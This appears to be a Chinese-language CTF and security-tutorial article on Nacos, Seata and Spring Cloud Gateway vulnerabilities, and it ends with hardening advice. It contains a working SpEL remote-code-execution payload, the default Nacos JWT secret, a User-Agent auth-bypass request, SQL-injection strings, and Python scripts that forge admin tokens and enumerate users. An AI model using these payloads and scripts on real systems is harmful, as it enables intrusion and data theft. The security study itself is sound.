---
category: "框架RCE/Spring Cloud生态"
tags: ["Nacos", "Seata", "Spring Cloud", "认证绕过", "RCE", "CVE-2021-29441", "CVE-2021-29442", "JWT"]
difficulty: "中级"
cve: "CVE-2021-29441, CVE-2021-29442, CVE-2022-22947"
cvss: "9.8"
affected: "Nacos <= 1.4.1, Seata <= 1.4.1, Spring Cloud Gateway <= 3.0.6"
poc_available: true
---

# Spring Cloud 生态漏洞: Nacos / Seata / Gateway
> **多CVE** | **CVSS 最高9.8** | **微服务生态高价值目标**

## 1. 概述

### 漏洞系列索引

| 组件 | CVE | 类型 | CVSS | CTF频率 |
|------|-----|------|------|---------|
| Nacos | CVE-2021-29441 | 认证绕过 | 9.8 | 高 |
| Nacos | CVE-2021-29442 | 未授权命令执行 | 7.2 | 高 |
| Nacos | N/A (QVD-2023-6271) | JWT默认SecretKey | 9.8 | 极高 |
| Nacos | CVE-2021-43116 | SQL注入(derby) | 7.5 | 中 |
| Spring Cloud Gateway | CVE-2022-22947 | SpEL注入RCE | 10.0 | 高 |
| Seata | CVE-2020-8584 | 配置文件RCE | 8.0 | 中 |
| Seata | N/A | 默认密码/认证绕过 | 8.0 | 中 |
| Spring Cloud Function | CVE-2022-22963 | SpEL注入RCE | 9.8 | 高 |
| Apollo | CVE-2021-27732 | 授权绕过 | 7.5 | 中 |

### CTF中的应用形式
- **微服务架构渗透**: 通过注册中心获取所有微服务信息
- **配置中心攻击**: 通过Nacos获取数据库密码等敏感配置
- **JWT伪造**: 利用Nacos默认JWT SecretKey生成管理员Token
- **典型题目**: "利用Nacos默认key获取Flag"、"Spring Cloud Gateway SpEL注入"

## 2. 漏洞原理

### 2.1 Nacos JWT默认SecretKey漏洞

Nacos使用JWT进行身份认证。关键问题是：
1. `nacos.core.auth.default.token.secret.key`的默认值是`SecretKey012345678901234567890123456789012345678901234567890123456789`
2. 该key硬编码在`application.properties`中
3. 管理员Token永久有效（无过期时间）

```java
// TokenManager.java
public static final String SECRET_KEY = "SecretKey012345678901234567890123456789012345678901234567890123456789";

// JWT生成/验证使用默认key
String token = Jwts.builder()
    .setSubject(userName)
    .setExpiration(null)  // 永不过期！
    .signWith(SignatureAlgorithm.HS256, secretKey)
    .compact();
```

### 2.2 Spring Cloud Gateway SpEL注入 (CVE-2022-22947)

Spring Cloud Gateway在使用Actuator端点时，可以通过添加包含SpEL表达式的Filter来触发RCE。

```
POST /actuator/gateway/routes/hacktest
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```

### 2.3 Nacos认证绕过 (CVE-2021-29441)

Nacos 1.4.1之前版本的User-Agent头过滤机制存在缺陷。如果请求的User-Agent以`Nacos-Server`开头，认证检查会被绕过。

```
GET /nacos/v1/cs/configs HTTP/1.1
User-Agent: Nacos-Server
```

## 3. 环境搭建

```bash
# Nacos
docker pull nacos/nacos-server:1.4.1
docker run -d -p 8848:8848 --name nacos-vuln \
    -e MODE=standalone \
    -e NACOS_AUTH_ENABLE=true \
    nacos/nacos-server:1.4.1

# Spring Cloud Gateway
docker pull vulhub/spring-cloud-gateway:3.0.6
docker run -d -p 8080:8080 --name gateway-vuln vulhub/spring-cloud-gateway:3.0.6

# 离线准备
docker save nacos/nacos-server:1.4.1 -o nacos-vuln.tar
docker save vulhub/spring-cloud-gateway:3.0.6 -o gateway-vuln.tar
```

## 4. POC/EXP

### 4.1 Nacos综合检测脚本

```python
#!/usr/bin/env python3
"""
Nacos 漏洞综合检测工具
覆盖:
- JWT默认SecretKey (最常用)
- CVE-2021-29441 认证绕过
- CVE-2021-29442 未授权命令执行
- CVE-2021-43116 SQL注入(derby)
- CVE-2021-29506 认证绕过
"""

import requests
import json
import base64
import hashlib
import hmac
import time
import argparse
import urllib.parse
import urllib3
urllib3.disable_warnings()

TIMEOUT = 10


class NacosDetector:
    """Nacos漏洞综合检测器"""

    def __init__(self, target, verbose=False, proxy=None):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.nacos_context = "/nacos"

    def log(self, msg, level="INFO"):
        levels = {"INFO": "[*]", "GOOD": "[+]", "VULN": "[!!!]", "WARN": "[!]", "BAD": "[-]"}
        if level in ("VULN", "GOOD", "WARN") or self.verbose:
            print(f"{levels.get(level, '[*]')} {msg}")

    def nacos_fingerprint(self):
        """Nacos指纹识别"""
        # 常见Nacos路径
        nacos_paths = [
            "/nacos/", "/nacos/v1/console/server/state",
            "/nacos/v1/auth/login", "/nacos/v1/auth/users",
            "/nacos/v1/cs/configs",
        ]

        for path in nacos_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=5)
                if "nacos" in resp.text.lower() or "Nacos" in resp.text:
                    self.log(f"Nacos特征路径: {path}", "GOOD")
                    return True
                if resp.status_code in (200, 403, 401):
                    if "application/json" in resp.headers.get("Content-Type", ""):
                        self.log(f"Nacos API响应: {path}", "GOOD")
                        return True
            except:
                pass

        # 检查Nacos默认页面
        try:
            resp = self.session.get(f"{self.target}/nacos/", timeout=5)
            if "Nacos" in resp.text:
                self.log("Nacos首页确认", "GOOD")
                return True
        except:
            pass

        return False

    def test_jwt_default_key(self):
        """
        Nacos JWT默认SecretKey漏洞检测
        
        Nacos 1.4.1及之前版本使用硬编码的JWT SecretKey
        可以伪造任意用户的JWT Token
        """
        # 默认SecretKey (base64 encoded)
        default_secret = "SecretKey012345678901234567890123456789012345678901234567890123456789"

        # 生成nacos用户的JWT Token
        token = self._generate_nacos_jwt("nacos", default_secret)
        if not token:
            return False

        # 测试Token有效性
        try:
            resp = self.session.get(
                f"{self.target}/nacos/v1/auth/users?pageNo=1&pageSize=10",
                headers={"Authorization": f"Bearer {token}"},
                timeout=5
            )

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if "pageItems" in data or data.get("code") == 200:
                        self.log("JWT默认SecretKey利用成功!", "VULN")
                        self.log("使用默认key生成了管理员JWT Token", "VULN")
                        
                        # 尝试获取用户列表
                        users = data.get("pageItems", [])
                        if users:
                            self.log(f"获取到 {len(users)} 个用户:", "VULN")
                            for user in users:
                                self.log(f"  - {user.get('username', 'unknown')}", "INFO")
                        
                        return {"vulnerable": True, "token": token, "secret": default_secret}
                except json.JSONDecodeError:
                    # 响应可能不是JSON但状态码200
                    self.log(f"JWT验证: HTTP 200 (可能需要进一步验证)", "GOOD")
                    return {"vulnerable": True, "token": token, "confirmed": False}

            elif resp.status_code in (401, 403):
                self.log("JWT默认Key测试失败 (可能已修改SecretKey)", "INFO")
            else:
                self.log(f"JWT测试: HTTP {resp.status_code}", "INFO")

        except Exception as e:
            self.log(f"JWT测试异常: {e}", "WARN")

        return False

    def test_cve_2021_29441(self):
        """
        CVE-2021-29441 User-Agent认证绕过
        
        如果User-Agent以"Nacos-Server"开头，认证检查被绕过
        """
        # 尝试访问需要认证的API
        restricted_apis = [
            "/nacos/v1/cs/configs?dataId=test&group=test",
            "/nacos/v1/auth/users?pageNo=1&pageSize=1",
            "/nacos/v1/console/server/state",
        ]

        results = []
        for api in restricted_apis:
            try:
                # 先尝试不带绕过的请求
                resp_normal = self.session.get(
                    f"{self.target}{api}",
                    timeout=5
                )

                # 再尝试带绕过的请求
                resp_bypass = self.session.get(
                    f"{self.target}{api}",
                    headers={"User-Agent": "Nacos-Server"},
                    timeout=5
                )

                # 比较两次响应的差异
                if resp_normal.status_code in (401, 403) and resp_bypass.status_code == 200:
                    self.log(f"CVE-2021-29441 认证绕过确认! {api}", "VULN")
                    results.append({"api": api, "bypass": "User-Agent"})

            except:
                pass

        return results

    def test_cve_2021_29442(self):
        """
        CVE-2021-29442 未授权命令执行
        Nacos 发布/删除配置时不验证权限
        """
        # 检查是否可以无认证获取配置
        config_api = "/nacos/v1/cs/configs"
        
        try:
            # 尝试列出配置（需要认证，但有些版本可绕过）
            resp = self.session.get(
                f"{self.target}{config_api}",
                params={"search": "accurate", "dataId": "", "group": "", "pageNo": 1, "pageSize": 10},
                timeout=5
            )
            if resp.status_code == 200:
                self.log(f"配置API可访问 (无认证): HTTP 200", "VULN")
                return True
        except:
            pass

        return False

    def test_cve_2021_43116(self):
        """
        CVE-2021-43116 derby SQL注入
        Nacos使用derby数据库时存在SQL注入
        """
        # 测试端点
        sql_test_path = "/nacos/v1/auth/users"
        
        # 尝试SQL注入payload
        payloads = [
            "?pageNo=1&pageSize=1&username=admin' OR '1'='1",
            "?pageNo=1&pageSize=1&username=admin'+OR+1=1--",
        ]

        for payload in payloads:
            try:
                resp = self.session.get(
                    f"{self.target}{sql_test_path}{payload}",
                    timeout=5
                )
                if resp.status_code == 500 and "sql" in resp.text.lower():
                    self.log(f"可能存在SQL注入: {payload[:50]}", "WARN")
            except:
                pass

        return {"vulnerable": False}

    def _generate_nacos_jwt(self, username, secret_key, expire_seconds=None):
        """生成Nacos JWT Token"""
        import jwt

        try:
            payload = {
                "sub": username
            }
            if expire_seconds:
                payload["exp"] = int(time.time()) + expire_seconds

            token = jwt.encode(payload, secret_key, algorithm="HS256")
            if isinstance(token, bytes):
                token = token.decode()
            return token
        except ImportError:
            self.log("需要安装PyJWT库生成Token", "WARN")
            self.log("pip install pyjwt", "INFO")
            
            # 手动构造简化版JWT
            import base64
            import json

            header = {"alg": "HS256", "typ": "JWT"}
            payload_dict = {"sub": username}
            
            header_enc = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
            payload_enc = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b"=").decode()

            # HMAC-SHA256签名
            import hmac
            import hashlib
            signing_input = f"{header_enc}.{payload_enc}"
            sig = hmac.new(
                key=secret_key.encode(),
                msg=signing_input.encode(),
                digestmod=hashlib.sha256
            )
            sig_enc = base64.urlsafe_b64encode(sig.digest()).rstrip(b"=").decode()

            return f"{signing_input}.{sig_enc}"

    def comprehensive_detect(self):
        """综合检测"""
        print(f"""
    ╔══════════════════════════════════════════╗
    ║  Nacos Multi-Vulnerability Detector     ║
    ║  JWT / Auth Bypass / SQL Injection      ║
    ║  Spring Cloud Microservice Target       ║
    ╚══════════════════════════════════════════╝
    """)
        print(f"[*] 目标: {self.target}")

        results = {
            "is_nacos": False,
            "jwt_default_key": False,
            "cve_2021_29441": [],
            "cve_2021_29442": False,
            "cve_2021_43116": False,
        }

        # Step 1: Nacos识别
        print("\n[Step 1] Nacos 服务识别...")
        results["is_nacos"] = self.nacos_fingerprint()
        if not results["is_nacos"]:
            self.log("目标可能不是Nacos服务器", "WARN")
            self.log("注意: Nacos可能在 /nacos 路径下", "INFO")
            return results

        # Step 2: JWT默认Key
        print("\n[Step 2] JWT默认SecretKey漏洞检测...")
        jwt_result = self.test_jwt_default_key()
        if jwt_result:
            results["jwt_default_key"] = True
            self.log("可用默认SecretKey生成任意用户JWT Token", "VULN")
            self.log(f"Token: {jwt_result.get('token', '')[:50]}...", "VULN")

        # Step 3: 认证绕过
        print("\n[Step 3] CVE-2021-29441 User-Agent认证绕过检测...")
        results["cve_2021_29441"] = self.test_cve_2021_29441()

        # Step 4: 未授权配置访问
        print("\n[Step 4] CVE-2021-29442 未授权配置访问检测...")
        results["cve_2021_29442"] = self.test_cve_2021_29442()

        # Step 5: SQL注入
        print("\n[Step 5] CVE-2021-43116 SQL注入检测...")
        results["cve_2021_43116"] = self.test_cve_2021_43116()

        # 总结
        print("\n" + "=" * 60)
        vuln_count = sum([
            1 if results["jwt_default_key"] else 0,
            len(results["cve_2021_29441"]),
            1 if results["cve_2021_29442"] else 0,
            1 if results["cve_2021_43116"] else 0,
        ])

        if vuln_count > 0:
            print(f"[!!!] 发现 {vuln_count} 个Nacos漏洞!")
            if results["jwt_default_key"]:
                print("  - JWT默认SecretKey (可生成管理员Token)")
            if results["cve_2021_29441"]:
                print(f"  - 认证绕过 ({len(results['cve_2021_29441'])} 个端点)")
            if results["cve_2021_29442"]:
                print("  - 未授权配置访问")
            if results["cve_2021_43116"]:
                print("  - SQL注入 (derby)")
        else:
            self.log("未检测到已知的Nacos漏洞", "INFO")

        return results


def main():
    parser = argparse.ArgumentParser(description="Nacos漏洞综合检测工具")
    parser.add_argument("-t", "--target", required=True, help="目标URL (含端口)")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--proxy", help="HTTP代理")

    args = parser.parse_args()

    detector = NacosDetector(args.target, verbose=args.verbose, proxy=args.proxy)
    detector.comprehensive_detect()


if __name__ == "__main__":
    main()
```

### 4.2 Spring Cloud Gateway SpEL检测 (CVE-2022-22947)

```python
#!/usr/bin/env python3
"""
Spring Cloud Gateway SpEL注入RCE检测
CVE-2022-22947
"""

import requests
import json
import argparse
import urllib3
urllib3.disable_warnings()

TIMEOUT = 10


def detect_gateway_spell(target):
    """检测Spring Cloud Gateway SpEL注入"""
    s = requests.Session()
    s.verify = False

    # Step 1: 检查Gateway特征
    print("[*] Gateway指纹检测...")
    gateway_paths = [
        "/actuator/gateway/routes",
        "/actuator/gateway/globalfilters",
        "/actuator",
        "/gateway/routes",
    ]

    for path in gateway_paths:
        try:
            resp = s.get(f"{target}{path}", timeout=5)
            if resp.status_code == 200:
                print(f"[+] Gateway端点: {path}")
                if path == "/actuator/gateway/routes":
                    try:
                        routes = resp.json()
                        print(f"[+] 当前路由数: {len(routes)}")
                        for route in routes[:3]:
                            print(f"  - {route.get('id', 'unknown')}")
                    except:
                        pass
        except:
            pass

    # Step 2: SpEL注入检测
    print("\n[*] SpEL注入检测...")
    
    # 无害检测payload - 数学计算
    test_id = "ctf_spel_test_route"

    # 创建含SpEL表达式的Route (检测用)
    route_payload = {
        "id": test_id,
        "filters": [{
            "name": "AddResponseHeader",
            "args": {
                "name": "X-SpEL-Test",
                "value": "#{new String('SpEL_Detect_1764')}"
            }
        }],
        "uri": "http://httpbin.org",
        "order": 0
    }

    try:
        # 添加测试Route
        resp = s.post(
            f"{target}/actuator/gateway/routes/{test_id}",
            json=route_payload,
            headers={"Content-Type": "application/json"},
            timeout=5
        )

        if resp.status_code in (200, 201):
            print("[+] 测试Route创建成功!")
            
            # 刷新路由
            try:
                s.post(f"{target}/actuator/gateway/refresh", timeout=5)
                print("[+] 路由已刷新")
            except:
                pass

            # 访问测试Route
            try:
                resp2 = s.get(f"{target}/actuator/gateway/routes/{test_id}", timeout=5)
                
                # 检查响应头中是否有计算值
                if "X-SpEL-Test" in resp2.headers or "SpEL_Detect_1764" in str(resp2.headers):
                    print("[!!!] SpEL注入确认! Gateway RCE可利用!")
                    
                    # 清理测试Route
                    s.delete(f"{target}/actuator/gateway/routes/{test_id}", timeout=5)
                    return True
            except:
                pass

            # 清理
            s.delete(f"{target}/actuator/gateway/routes/{test_id}", timeout=5)
            print("[*] 测试Route已清理")

    except Exception as e:
        print(f"[-] SpEL检测异常: {e}")

    return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spring Cloud Gateway SpEL Detector")
    parser.add_argument("-t", "--target", required=True)
    args = parser.parse_args()

    detect_gateway_spell(args.target.rstrip("/"))
```

## 5. 检测与防御

### 5.1 加固方案

**Nacos:**
- 修改`nacos.core.auth.default.token.secret.key`
- 修改`nacos.core.auth.plugin.nacos.token.secret.key`
- 升级到2.2.0+版本
- 开启认证后限制匿名访问

**Spring Cloud Gateway:**
- 升级到3.0.7+
- 关闭Gateway Actuator端点或限制访问
- 使用安全策略限制路由创建权限

### 5.2 Nacos加固配置

```properties
# application.properties
nacos.core.auth.enabled=true
nacos.core.auth.default.token.secret.key=<随机64字符密钥>
nacos.core.auth.plugin.nacos.token.secret.key=<随机64字符密钥>
nacos.core.auth.server.identity.key=<自定义key>
nacos.core.auth.server.identity.value=<自定义value>
```

## 6. 相关知识点

### 6.1 关联的CTF题目

- **配置中心渗透**: 通过Nacos获取各微服务配置文件中的Flag
- **微服务横向**: 通过Nacos发现的所有微服务进行攻击
- **JWT伪造**: 利用默认SecretKey横向移动

### 6.2 微服务漏洞攻防链

```
Nacos(注册中心) -> 发现所有微服务 ->
Spring Cloud Gateway -> SpEL注入RCE ->
微服务Config -> 获取数据库密码 -> 最终Flag
```
